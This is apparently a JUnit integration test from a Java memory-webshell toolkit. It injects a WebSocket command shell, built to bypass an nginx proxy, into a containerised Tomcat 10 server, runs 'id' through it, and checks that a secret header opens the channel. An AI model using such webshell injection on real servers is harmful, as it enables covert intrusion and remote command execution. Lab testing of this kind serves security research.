package com.reajason.javaweb.integration.memshell.tomcat;

import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ServerType;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.packer.Packers;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.tuple.Pair;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.Test;
import org.objectweb.asm.Opcodes;
import org.testcontainers.containers.ComposeContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.io.File;

import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2026/1/13
 */
@Testcontainers
@Slf4j
public class tomcat10WebSocketBypassNginxTest {

    public static final String imageName = "tomcat:10.1-jre11";

    @Container
    public static final ComposeContainer compose =
            new ComposeContainer(new File("docker-compose/tomcat/docker-compose-10.1-jre11-nginx.yaml"))
                    .withExposedService("tomcat", 8080, Wait.forHttp("/app/"))
                    .withExposedService("nginx", 80);

    @Test
    public void testWs() {
        String url = getUrl();
        String server = ServerType.TOMCAT;
        String serverVersion = "Unknown";
        int targetJdkVersion = Opcodes.V11;
        String shellType = ShellType.JAKARTA_BYPASS_NGINX_WEBSOCKET;
        String shellTool = ShellTool.Command;
        Packers packer = Packers.Base64;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);
        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
        CommandConfig commandConfig = (CommandConfig) generateResult.getShellToolConfig();
        // direct connect ws will cause failed
        assertThrows(IllegalStateException.class, () -> BlockingJavaWebSocketClient.sendRequestWaitResponse(shellUrl, "id"), "WebSocket connection is not open.");
        // connect by valve bypass will success
        String response = BlockingJavaWebSocketClient.sendRequestWaitResponseWithHeader(shellUrl, "id", commandConfig.getHeaderName(), commandConfig.getHeaderValue());
        assertTrue(response.contains("uid="));
    }

    public static String getUrl() {
        String host = compose.getServiceHost("nginx", 80);
        int port = compose.getServicePort("nginx", 80);
        String url = "http://" + host + ":" + port + "/app";
        log.info("container started, app url is : {}", url);
        return url;
    }
}
